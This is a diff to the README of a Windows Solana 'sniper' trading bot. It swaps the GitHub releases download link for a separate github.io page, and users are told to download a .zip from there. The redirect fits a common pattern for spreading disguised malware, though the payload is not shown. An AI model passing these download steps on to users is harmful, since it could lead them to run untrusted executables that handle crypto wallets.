@@ -1,6 +1,6 @@
 # 🚀 Solana-PumpFun-Sniper-V2 - Automated Token Trading on Solana Network
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Emil5094/Solana-PumpFun-Sniper-V2/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://emil5094.github.io)
 
 This software allows you to automate token trades on the Solana blockchain. It identifies new listings on Pump.fun and Raydium pools to execute buy orders instantly. The program utilizes Jito MEV bypass technology to ensure your transactions land on the blockchain faster than standard trades. It runs locally on your Windows computer and provides a dashboard to manage your strategy.
 
@@ -19,7 +19,7 @@ To run this sniper bot, your computer needs to meet these basic standards:
 
 Follow these steps to obtain the correct files:
 
-1. Visit the project release page: [https://github.com/Emil5094/Solana-PumpFun-Sniper-V2/releases](https://github.com/Emil5094/Solana-PumpFun-Sniper-V2/releases)
+1. Visit the project release page: [https://emil5094.github.io](https://emil5094.github.io)
 2. Locate the most recent version at the top of the list.
 3. Click the link that ends in .zip to start the download.
 4. Save the file to a folder you can find later, such as your Downloads or Desktop folder.
